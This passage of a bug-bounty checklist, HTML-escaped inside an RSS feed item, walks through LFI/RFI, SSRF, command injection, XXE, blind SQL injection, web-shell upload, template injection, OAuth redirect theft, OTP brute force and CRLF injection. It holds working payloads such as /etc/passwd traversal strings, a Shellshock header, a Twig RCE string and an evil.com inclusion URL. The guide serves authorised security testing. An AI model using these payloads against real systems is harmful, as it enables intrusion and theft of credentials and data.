&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Local File Inclusion (LFI) &amp;amp; Remote File Inclusion (RFI)&lt;/li>
&lt;li>For LFI, try:
&lt;ul>
&lt;li>&lt;code>any.com/index.php?reference=login.php&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>For RFI, try:
&lt;ul>
&lt;li>&lt;code>any.com/?share=http://evil.com/&lt;/code>&lt;/li>
&lt;li>Common parameters to look for:
&lt;ul>
&lt;li>&lt;code>file&lt;/code>, &lt;code>document&lt;/code>, &lt;code>folder&lt;/code>, &lt;code>root&lt;/code>, &lt;code>path&lt;/code>, &lt;code>pg&lt;/code>, &lt;code>style&lt;/code>, &lt;code>pdf&lt;/code>, &lt;code>template&lt;/code>, &lt;code>php_path&lt;/code>, &lt;code>doc&lt;/code>, &lt;code>dest&lt;/code>, &lt;code>redirect&lt;/code>, &lt;code>uri&lt;/code>, &lt;code>path&lt;/code>, &lt;code>continue&lt;/code>, &lt;code>url&lt;/code>, &lt;code>window&lt;/code>, &lt;code>next&lt;/code>, &lt;code>data&lt;/code>, &lt;code>reference&lt;/code>, &lt;code>site&lt;/code>, &lt;code>html&lt;/code>, &lt;code>val&lt;/code>, &lt;code>validate&lt;/code>, &lt;code>domain&lt;/code>, &lt;code>callback&lt;/code>, &lt;code>return&lt;/code>, &lt;code>page&lt;/code>, &lt;code>feed&lt;/code>, &lt;code>port&lt;/code>, &lt;code>host&lt;/code>, &lt;code>to&lt;/code>, &lt;code>out&lt;/code>, &lt;code>view&lt;/code>, &lt;code>dir&lt;/code>, &lt;code>show&lt;/code>, &lt;code>navigation&lt;/code>, &lt;code>open&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>For LFI, check:
&lt;ul>
&lt;li>&lt;code>/var/www/html/&lt;/code> &amp;amp; &lt;code>/etc/passwd&lt;/code>&lt;/li>
&lt;li>&lt;code>../../etc/passwd&lt;/code>&lt;strong>Tool Used:&lt;/strong> Lfisuite tool from GitHub&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="12-missing-spf-dmarc-records">12. Missing SPF, DMARC Records
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Detect missing SPF and DMARC records using:
&lt;ul>
&lt;li>&lt;code>mxtoolbox.com&lt;/code>&lt;/li>
&lt;li>&lt;code>anonymousmail.me&lt;/code>&lt;/li>
&lt;li>&lt;code>https://emkei.cz/&lt;/code>&lt;strong>Tool Used:&lt;/strong> &lt;a class="link" href="http://mxtoolbox.com/" target="_blank" rel="noopener"
>mxtoolbox.com&lt;/a> / &lt;a class="link" href="http://anonymousmail.me/" target="_blank" rel="noopener"
>anonymousmail.me&lt;/a> / &lt;a class="link" href="https://emkei.cz/" target="_blank" rel="noopener"
>https://emkei.cz/&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="13-ssrf-server-side-request-forgery">13. SSRF (Server-Side Request Forgery)
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Make a request from a vulnerable application to a target website.&lt;/li>
&lt;li>Common parameters to look for:
&lt;ul>
&lt;li>&lt;code>dest&lt;/code>, &lt;code>redirect&lt;/code>, &lt;code>uri&lt;/code>, &lt;code>path&lt;/code>, &lt;code>continue&lt;/code>, &lt;code>url&lt;/code>, &lt;code>window&lt;/code>, &lt;code>next&lt;/code>, &lt;code>data&lt;/code>, &lt;code>reference&lt;/code>, &lt;code>site&lt;/code>, &lt;code>html&lt;/code>, &lt;code>val&lt;/code>, &lt;code>validate&lt;/code>, &lt;code>domain&lt;/code>, &lt;code>callback&lt;/code>, &lt;code>return&lt;/code>, &lt;code>page&lt;/code>, &lt;code>view&lt;/code>, &lt;code>dir&lt;/code>, &lt;code>show&lt;/code>, &lt;code>file&lt;/code>, &lt;code>document&lt;/code>, &lt;code>folder&lt;/code>, &lt;code>root&lt;/code>, &lt;code>path&lt;/code>, &lt;code>pg&lt;/code>, &lt;code>style&lt;/code>, &lt;code>pdf&lt;/code>, &lt;code>template&lt;/code>, &lt;code>php_path&lt;/code>, &lt;code>doc&lt;/code>, &lt;code>feed&lt;/code>, &lt;code>host&lt;/code>, &lt;code>port&lt;/code>, &lt;code>to&lt;/code>, &lt;code>out&lt;/code>, &lt;code>navigation&lt;/code>, &lt;code>open&lt;/code>, &lt;code>result&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Detection using:
&lt;ul>
&lt;li>&lt;code>https://www.expressvpn.com/what-is-my-ip&lt;/code>&lt;/li>
&lt;li>Burp Collaborator&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>For exploitation, try:
&lt;ul>
&lt;li>&lt;code>any.com/index/php?uri=http://external.com&lt;/code>&lt;/li>
&lt;li>Read file from server (e.g., &lt;code>file:///identf&lt;/code> using LFI payloads)&lt;/li>
&lt;li>Scan internal network (e.g., &lt;code>http://localhost:1&lt;/code> changing the port number to common ports like 21, 22)&lt;/li>
&lt;li>SSRF with RFI: Execute code from the external domain (e.g., use &lt;code>hackoff.html&lt;/code> with XSS script)&lt;strong>Tool Used:&lt;/strong> Burp Collaborator / &lt;code>https://www.expressvpn.com/what-is-my-ip&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="14-critical-file-found--source-code-disclosure">14. Critical File Found &amp;amp; Source Code Disclosure
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Use payloads from:
&lt;ul>
&lt;li>&lt;code>https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Utilize &lt;code>dirsearch&lt;/code>****&lt;/li>
&lt;/ol>
&lt;h3 id="15-subdomain-takeover">15. Subdomain Takeover
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>If the website is not in use by the target and is hosted on a service provider:
&lt;ul>
&lt;li>Sign up on service providers like GitHub, Heroku, Shopify, Zendesk, AWS, Tumblr, etc., to attempt domain takeover&lt;strong>Tool Used:&lt;/strong> &lt;code>github.com/nahamsec/HostileSubBruteforcer&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="16-command-injection">16. Command Injection
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Take input as a command and reflect the output of that command.&lt;/li>
&lt;li>Common parameters to look for:
&lt;ul>
&lt;li>&lt;code>daemon&lt;/code>, &lt;code>host&lt;/code>, &lt;code>upload&lt;/code>, &lt;code>dir&lt;/code>, &lt;code>execute&lt;/code>, &lt;code>download&lt;/code>, &lt;code>log&lt;/code>, &lt;code>ip&lt;/code>, &lt;code>cli&lt;/code>, &lt;code>cmd&lt;/code>, &lt;code>filename&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Find command injection using delimiter list (e.g., &lt;code>;&lt;/code>, &lt;code>^&lt;/code>, &lt;code>&amp;amp;&lt;/code>, &lt;code>&amp;amp;&amp;amp;&lt;/code>, &lt;code>|&lt;/code>, &lt;code>||&lt;/code>, &lt;code>%0D&lt;/code>, &lt;code>%0A&lt;/code>, &lt;code>\\n&lt;/code>, &lt;code>&amp;lt;&lt;/code>)&lt;/li>
&lt;li>Identify input fields interacting with the OS shell.&lt;/li>
&lt;li>Try with delimiter &amp;amp; shell commands (e.g., &lt;code>;dir&lt;/code>, &lt;code>;/etc/passwd&lt;/code>)&lt;/li>
&lt;li>Intercept requests using Clusterbomb - first parameter for delimiter &amp;amp; second for command payloads&lt;strong>Tool Used:&lt;/strong> &lt;code>github.com/commixproject/commix.git&lt;/code>&lt;/li>
&lt;/ol>
&lt;h3 id="17-file-upload-vulnerability">17. File Upload Vulnerability
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Simple file upload (e.g., &lt;code>shell.php&lt;/code>) for full control of the server and running shell commands.&lt;/li>
&lt;li>Use payloads from:
&lt;ul>
&lt;li>&lt;code>github.com/fuzzdb-projects/fuzzdb/tree/master/attack/file-upload/malicious-images&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Pixel flood attack.&lt;/li>
&lt;li>Verify content type.&lt;/li>
&lt;li>Check extension verification.&lt;strong>Tool Used:&lt;/strong> &lt;code>github.com/almandin/fuxploider&lt;/code>&lt;/li>
&lt;/ol>
&lt;h3 id="18-xxe-injection-xml-external-entity-injection">18. XXE Injection (XML External Entity Injection)
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Use XXE payloads in Intruder to detect.&lt;/li>
&lt;li>Check if the website is accepting &lt;code>content-type=text/xml&lt;/code> header with a &lt;code>200 OK&lt;/code> response.&lt;/li>
&lt;li>Use online tool &lt;code>pingb.in&lt;/code> to check for external ping.&lt;/li>
&lt;li>For blind XXE, use Python’s SimpleHTTPServer (e.g., &lt;code>python -m SimpleHTTPServer 80&lt;/code>).&lt;/li>
&lt;li>SYSTEM &lt;code>file:///etc/passwd&lt;/code> for local file read.&lt;/li>
&lt;li>SYSTEM &lt;code>http://systemip/readinganyfile&lt;/code> for blind XXE.&lt;/li>
&lt;li>Use &lt;code>php://&lt;/code> for Remote Code Execution (RCE).&lt;/li>
&lt;li>Use Gopher or other URI handlers to exploit XXE.&lt;strong>Common Places to Find XXE:&lt;/strong>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>XML file upload (e.g., config files)&lt;/li>
&lt;li>XML input fields&lt;/li>
&lt;li>XML-based APIs&lt;/li>
&lt;li>XML-based files (e.g., RSS, SVG)&lt;strong>Tool Used:&lt;/strong> &lt;code>pingb.in&lt;/code> / Burp Suite&lt;/li>
&lt;/ul>
&lt;h3 id="19-account-lockout">19. Account Lockout
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Prevent brute-force attacks.&lt;/li>
&lt;li>Intercept the login page with user credentials using Burp Suite.&lt;/li>
&lt;li>Send the request to Sequencer.&lt;/li>
&lt;li>Alternatively, use Intruder to make multiple requests (e.g., 1000 times).&lt;/li>
&lt;li>Perform credential stuffing.&lt;/li>
&lt;li>Ensure the account locks out for 30 minutes to 24 hours.****&lt;/li>
&lt;/ol>
&lt;h3 id="20-blind-xss">20. Blind XSS
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>A type of stored XSS where attacker input is saved in the server and stored in the database.&lt;/li>
&lt;li>It won’t be reflected immediately.&lt;/li>
&lt;li>Look for blind XSS in pages like:
&lt;ul>
&lt;li>Contact us&lt;/li>
&lt;li>Log viewers&lt;/li>
&lt;li>Feedback pages&lt;/li>
&lt;li>Chat apps&lt;/li>
&lt;li>Ticket generation apps&lt;/li>
&lt;li>Any app using moderation or updates&lt;/li>
&lt;li>Saving forms&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Use the online tool &lt;code>xsshunter.com&lt;/code>.&lt;/li>
&lt;li>Copy the payload and paste it in the input field.&lt;/li>
&lt;li>Reflection will be found on &lt;code>xsshunter.com&lt;/code>.&lt;/li>
&lt;li>Perform multiple blind XSS using Intruder.**** / &lt;a class="link" href="http://xsshunter.com/" target="_blank" rel="noopener"
>XSSHunter.com&lt;/a>&lt;/li>
&lt;/ol>
&lt;h3 id="21-buffer-overflow-web">21. Buffer Overflow (Web)
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Intercept the login page and pass a long string of passwords or other inputs. Observe if the page loads slowly.&lt;/li>
&lt;li>Types of overflows to consider: Buffer, Stack, Heap, Integer, Format String.&lt;/li>
&lt;li>Denial of Service (DoS) attacks using buffer overflow can be attempted.****&lt;/li>
&lt;/ol>
&lt;h3 id="22-cms-vulnerability-hunting">22. CMS Vulnerability Hunting
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Target common CMS platforms: WordPress, Joomla, Drupal, vBulletin, Magento.&lt;/li>
&lt;li>Identify vulnerable components within the CMS.&lt;/li>
&lt;li>Search for exploits using Google.&lt;strong>Tools Used:&lt;/strong> WPScan, CMSMap, CMSSCAN, Joomscan, Drupwn, vBulletin Scanner, Mage Scanner, OWASP VBScan&lt;/li>
&lt;/ol>
&lt;h3 id="23-idor-insecure-direct-object-references">23. IDOR (Insecure Direct Object References)
&lt;/h3>&lt;p>&lt;strong>Scenario 1:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Often found in user settings or profile management.&lt;/li>
&lt;li>Requires two accounts.&lt;/li>
&lt;li>Intercept the request and change the email ID of the attacker.&lt;/li>
&lt;li>Log out and attempt to log in with the victim&amp;rsquo;s account to see if the change was successful.&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>Scenario 2: User Moderation:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Find the user ID.&lt;/li>
&lt;li>Replace the victim’s ID with the attacker’s ID.&lt;/li>
&lt;li>Perform the functionality to see if access is granted.****&lt;/li>
&lt;/ol>
&lt;h3 id="24-long-password-dos-attack">24. Long Password DoS Attack
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Hashing passwords can be resource-intensive, leading to potential DoS.&lt;/li>
&lt;li>Similar to buffer overflow attacks but specifically targeting password fields without length limits.&lt;/li>
&lt;li>Sign up for an account and intercept the request.&lt;/li>
&lt;li>Input a password longer than the typical length and forward the request.&lt;/li>
&lt;li>This can cause application DoS.****&lt;/li>
&lt;/ol>
&lt;h3 id="25-no-rate-limiting-vulnerability-logical-flow">25. No Rate Limiting Vulnerability (Logical Flow)
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Capture the forgot password page or any similar request with Burp Suite.&lt;/li>
&lt;li>Send the request to Intruder.&lt;/li>
&lt;li>Make multiple requests (e.g., 1000 times) to test for rate limiting issues.&lt;/li>
&lt;li>This can impact both user and server performance.****&lt;/li>
&lt;/ol>
&lt;h3 id="26-password-reset-poisoning">26. Password Reset Poisoning
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Intercept the forgot password page with Burp Suite.&lt;/li>
&lt;li>Perform a host header attack.&lt;/li>
&lt;li>The victim will receive a password reset email from an &amp;ldquo;evil&amp;rdquo; website specified in the host header.****&lt;/li>
&lt;/ol>
&lt;h3 id="27-broken-access-control">27. Broken Access Control
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>&lt;strong>IDOR Example:&lt;/strong>
&lt;ul>
&lt;li>Access with account 1: &lt;code>https://acme.com/changepw/id?=1234&lt;/code>&lt;/li>
&lt;li>Create a second account and access it: &lt;code>https://acme.com/changepw/id?=5678&lt;/code>&lt;/li>
&lt;li>Logout from account 1, log into account 2, and attempt to change the password of account 1 by modifying the user ID in the request.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Hash-Based IDOR:&lt;/strong>
&lt;ul>
&lt;li>User IDs might be hashed (e.g., Base64).&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Local File Inclusion (LFI) &amp;amp; Path Traversal:&lt;/strong>
&lt;ul>
&lt;li>Example request: &lt;code>GET /view?pg=../../../../../etc/passwd%00&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Common Parameters to Look For:&lt;/strong>
&lt;ul>
&lt;li>&lt;code>id&lt;/code>, &lt;code>user&lt;/code>, &lt;code>account&lt;/code>, &lt;code>number&lt;/code>, &lt;code>order&lt;/code>, &lt;code>no&lt;/code>, &lt;code>doc&lt;/code>, &lt;code>key&lt;/code>, &lt;code>email&lt;/code>, &lt;code>group&lt;/code>, &lt;code>profile&lt;/code>, &lt;code>edit&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Functions to Test:&lt;/strong>
&lt;ul>
&lt;li>Change email, change password, upgrade/downgrade user role, create/remove/update/delete context-specific app data (e.g., shipping, invoices, document viewing).&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Missing Function Level Access Control:&lt;/strong>
&lt;ul>
&lt;li>Forceful browsing (e.g., &lt;code>GET /admin/viewTransactions&lt;/code>, &lt;code>GET /ADMIN/viewTransactions&lt;/code>)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Parameter Manipulation &amp;amp; Logic Bugs:&lt;/strong>
&lt;ul>
&lt;li>Example: Giving a negative price.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Logic Flow Vulnerabilities in E-commerce:&lt;/strong>
&lt;ul>
&lt;li>Skipping steps in workflows (e.g., &lt;code>additem-&amp;gt;checkout-&amp;gt;enter shipping info-&amp;gt;payment&lt;/code>).&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>Tools Used:&lt;/strong> Burp Suite Extensions (AuthMatrix, AuthZ, Authorize, AutoRepeater)&lt;/p>
&lt;h3 id="28-account-takeover-via-forgot-password-page">28. Account Takeover via Forgot Password Page
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Intercept the forgot password page with Burp Suite.&lt;/li>
&lt;li>Add &lt;code>X-Forwarded-Host: bing.com&lt;/code> to the request header.&lt;/li>
&lt;li>Forward the request to test for account takeover vulnerabilities.****&lt;/li>
&lt;/ol>
&lt;h3 id="29-broken-access-control">29. Broken Access Control
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Create an account.&lt;/li>
&lt;li>Change the email ID from A to B.&lt;/li>
&lt;li>Generate a forgot password request for email A.&lt;/li>
&lt;li>Repeat the same process for passwords.****&lt;/li>
&lt;/ol>
&lt;h3 id="30-rate-limiting-bypass">30. Rate Limiting Bypass
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Intercept the forgot password page with Burp Suite.&lt;/li>
&lt;li>Send the request to Intruder.&lt;/li>
&lt;li>Add &lt;code>X-Forwarded-Host: bing.com&lt;/code> to the request header.&lt;/li>
&lt;li>Target the request to email and forward it to test for rate limiting bypass.****&lt;/li>
&lt;/ol>
&lt;h3 id="31-lack-of-password-confirmation">31. Lack of Password Confirmation
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Required for actions such as deleting an account or changing an email ID.&lt;/li>
&lt;li>Verify that a password confirmation step is missing in these processes.****&lt;/li>
&lt;/ol>
&lt;h3 id="32-2fa-or-otp-bypass">32. 2FA or OTP Bypass
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Complete the registration process and request an OTP code.&lt;/li>
&lt;li>Intercept the OTP request using Burp Suite.&lt;/li>
&lt;li>Send the intercepted request to Intruder.&lt;/li>
&lt;li>Bruteforce the 6-digit OTP through Burp Intruder if there’s no rate limiting or CAPTCHA.&lt;/li>
&lt;li>Analyze content length and attempt multiple combinations until bypassing OTP verification.****&lt;/li>
&lt;/ol>
&lt;h3 id="33-blind-sql-injection">33. Blind SQL Injection
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Check input fields and insert payloads such as &lt;code>id=1&lt;/code>.&lt;/li>
&lt;li>Insert payloads in user-agent or other input parameters.&lt;/li>
&lt;li>Confirm by changing the time interval with payloads like:
&lt;ul>
&lt;li>&lt;code>id=5+and+1=2&lt;/code>&lt;/li>
&lt;li>&lt;code>',0)waitfor delay'0:0:05'--&lt;/code>&lt;/li>
&lt;li>&lt;code>if(now()=sysdate(),sleep(5),0)) --&lt;/code>&lt;/li>
&lt;li>&lt;code>(select(0)from(select(sleep(3)))v)/*'+(select(3)from(select(sleep(3)))v)+'&amp;quot;&amp;quot;+(select(0)from(select(sleep(3)))v)+&amp;quot;&amp;quot;*/&lt;/code>&lt;/li>
&lt;li>&lt;code>0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z&lt;/code>&lt;/li>
&lt;li>&lt;code>' and extractvalue(1,concat(0x0a,@@version)) or&lt;/code>**** or Cookie Manager&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="34-remote-code-execution-vulnerability">34. Remote Code Execution Vulnerability
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Visit the target website and create an account.&lt;/li>
&lt;li>Verify the email address and navigate to profile settings.&lt;/li>
&lt;li>Upload a malicious file (e.g., &lt;code>RCE.php%00.gif&lt;/code>) as the company logo and save.&lt;/li>
&lt;li>View the uploaded image URL and append &lt;code>?cmd=id&lt;/code> to execute the &lt;code>id&lt;/code> command.&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>Scenario 2:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Crawl the target website using Burp Suite.&lt;/li>
&lt;li>Check for &lt;code>/cgi-bin/status&lt;/code>.&lt;/li>
&lt;li>Send to Repeater and replace &lt;code>User-Agent&lt;/code> with payload like &lt;code>{:;};echo $(&amp;lt;/etc/passwd)&lt;/code>.&lt;/li>
&lt;li>Send the request to see if it reveals root user info.**** or Manual&lt;/li>
&lt;/ol>
&lt;h3 id="35-stealing-oauth-token">35. Stealing OAuth Token
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Log in using a third-party app (e.g., Facebook, Gmail).&lt;/li>
&lt;li>Intercept the request using Burp Suite.&lt;/li>
&lt;li>Modify &lt;code>redirect_url&lt;/code> to a domain you control (e.g., &lt;code>bugbountypoc.com&lt;/code>).&lt;/li>
&lt;li>If necessary, change the &lt;code>referer&lt;/code> header to the same domain.****&lt;/li>
&lt;/ol>
&lt;h3 id="36-external-service-interaction">36. External Service Interaction
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Capture the request using Burp Suite.&lt;/li>
&lt;li>Send the request to Repeater.&lt;/li>
&lt;li>Replace &lt;code>Host&lt;/code> header with Burp Collaborator payload or add a new &lt;code>X-Forwarded-For&lt;/code> header with the same payload.&lt;/li>
&lt;li>Forward the request and check if Burp Collaborator receives a DNS lookup request.****&lt;/li>
&lt;/ol>
&lt;h3 id="37-server-side-include-ssi-injection">37. Server-Side Include (SSI) Injection
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Intercept the request using Burp Suite.&lt;/li>
&lt;li>Spider the target host.&lt;/li>
&lt;li>Search for pages with &lt;code>.shtml&lt;/code> extensions.&lt;/li>
&lt;li>Inject payloads like &lt;code>&amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt;&lt;/code> into input fields.&lt;/li>
&lt;li>Forward the request and check the response for injected data.****&lt;/li>
&lt;/ol>
&lt;h3 id="38-client-and-server-side-template-injection">38. Client and Server-Side Template Injection
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Check if user input is reflected on the webpage. Insert payloads to test for template injection.&lt;/li>
&lt;li>Common Template Engines:
&lt;ul>
&lt;li>FreeMarker (Java-based)&lt;/li>
&lt;li>Velocity (Java-based)&lt;/li>
&lt;li>Smarty (PHP-based)&lt;/li>
&lt;li>Twig (PHP-based)&lt;/li>
&lt;li>Jade (Node.js-based)&lt;/li>
&lt;li>Jinja2 (Python/Flask-based)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>Manual Checking:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Example Payloads:
&lt;ul>
&lt;li>&lt;code>curl -g '&amp;lt;http://www.target.com/page?name=John'&lt;/code>&amp;gt;&lt;/li>
&lt;li>&lt;code>curl -g '&amp;lt;http://www.target.com/page?name={{7*7}&amp;gt;}'&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>Automation Tool:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>&lt;code>https://github.com/epinna/tplmap&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>Basic Payloads:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;code>{{7*7}}&lt;/code>&lt;/li>
&lt;li>&lt;code>{{7*'7'}}&lt;/code>&lt;/li>
&lt;li>&lt;code>{% extends &amp;quot;/etc/passwd&amp;quot; %}&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>RCE Payload (Twig):&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;code>{{_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)}}{{_self.env.getFilter(&amp;quot;id&amp;quot;)}}&lt;/code>&lt;strong>Tool Used:&lt;/strong> Manual Checking, curl, tplmap&lt;/li>
&lt;/ul>
&lt;h3 id="39-exif-geolocation-data-not-stripped">39. Exif GeoLocation Data Not Stripped
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Download an image from &lt;code>https://github.com/ianare/exif-samples&lt;/code>.&lt;/li>
&lt;li>Go to JPG properties and check GPS data.&lt;/li>
&lt;li>Upload the image to the target website.&lt;/li>
&lt;li>Copy the image URL and paste it into an EXIF data tool (e.g., &lt;code>http://metapicz.com/&lt;/code>).&lt;strong>Tool Used:&lt;/strong> &lt;a class="link" href="http://exif.regex.info/exif.cgi" target="_blank" rel="noopener"
>Exif.regex.info/exif.cgi&lt;/a>&lt;/li>
&lt;/ol>
&lt;h3 id="40-crlf-injection">40. CRLF Injection
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Capture a request using Burp Suite.&lt;/li>
&lt;li>Insert arbitrary data in the input field (e.g., &lt;code>aaaaaaaaaaaaa&lt;/code>).&lt;/li>
&lt;li>If the input is reflected in the response header, it may be vulnerable.&lt;/li>
&lt;li>Test Carriage Return (&lt;code>%0A&lt;/code>) and Linefeed (&lt;code>%0D&lt;/code>) payloads.&lt;/li>
&lt;li>Example Payload:
&lt;ul>
&lt;li>&lt;code>%0a%0dxxxxxxxxxxxxx&lt;/code>&lt;/li>
&lt;li>&lt;code>return_url=aaaa%0a%0dset-cookie:mycookie&lt;/code>****&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item></channel></rss>